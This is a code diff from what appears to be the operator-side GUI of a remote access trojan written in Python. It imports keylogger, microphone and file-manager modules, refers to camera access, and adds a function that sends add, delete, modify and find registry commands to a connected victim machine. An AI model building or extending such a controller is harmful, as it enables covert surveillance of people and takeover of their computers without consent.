@@ -4,7 +4,7 @@ from pynput import keyboard
 from microphone import *
 from keylogger import *
 from fileManager import *
-
+from regedit import *
 
 operation_map = {
     "fileManager": "File manager opened",
@@ -67,20 +67,43 @@ async def fileManager(GUI, operation):
         GUI.fileUpload.setEnabled(True)
         GUI.fileExcute.setEnabled(True)
 
-
-async def regmanager(GUI):
+async def regmanager(GUI,action):
     # 这里放具体的操作
-    try:
-        operation = "Hello, Server!"
-        GUI.connections["regManager"]["writer"].write(operation.encode())
-        await GUI.connections["regManager"]["writer"].drain()
-        GUI.append_log(f"[*] Sent operation: {operation}")
+    value = GUI.regValueInput.text()
+    hive = GUI.regRootKey.text()
+    key_path = GUI.regPath.text()
+    key_name = GUI.regKeyName.text()
 
-        GUI.append_log("[*] Waiting for response...")
-        response = await GUI.connections["regManager"]["reader"].read(1024)
-        GUI.append_log(f"[*] Received response: {response.decode('utf-8')}")
+    try:
+        if action == "add":
+            GUI.append_log("[*] 正在进行注册表添加...")
+            GUI.connections["regManager"]["writer"]
+            GUI.connections["regManager"]["reader"]
+            await send_registry_request(GUI, GUI.connections["regManager"]["writer"],GUI.connections["regManager"]["reader"],'add', hive, key_path, key_name, value)
+
+        elif action == "delete":
+            GUI.append_log("[*] 正在删除注册表...")
+            GUI.connections["regManager"]["writer"]
+            GUI.connections["regManager"]["reader"]
+            await send_registry_request(GUI,GUI.connections["regManager"]["writer"],GUI.connections["regManager"]["reader"],'delete', hive, key_path, key_name)
+
+        elif action == "modify":
+            GUI.append_log("[*] 正在修改注册表...")
+            GUI.connections["regManager"]["writer"]
+            GUI.connections["regManager"]["reader"]
+            await send_registry_request(GUI,GUI.connections["regManager"]["writer"],GUI.connections["regManager"]["reader"],'modify', hive, key_path, key_name, value)
+
+        elif action == "find":
+            GUI.append_log("[*] 正在进行注册表查找...")
+            GUI.connections["regManager"]["writer"]
+            GUI.connections["regManager"]["reader"]
+            await send_registry_request(GUI,GUI.connections["regManager"]["writer"],GUI.connections["regManager"]["reader"],'find', hive, key_path, key_name)
+
+        else:
+            print("Unknown action")
+    
     except Exception as e:
-        GUI.append_log(f"[!] Unexpected error: {e}")
+        GUI.append_log(f"[!] 注册表操作未知错误: {e}")
 
 
 async def opencamera(GUI):
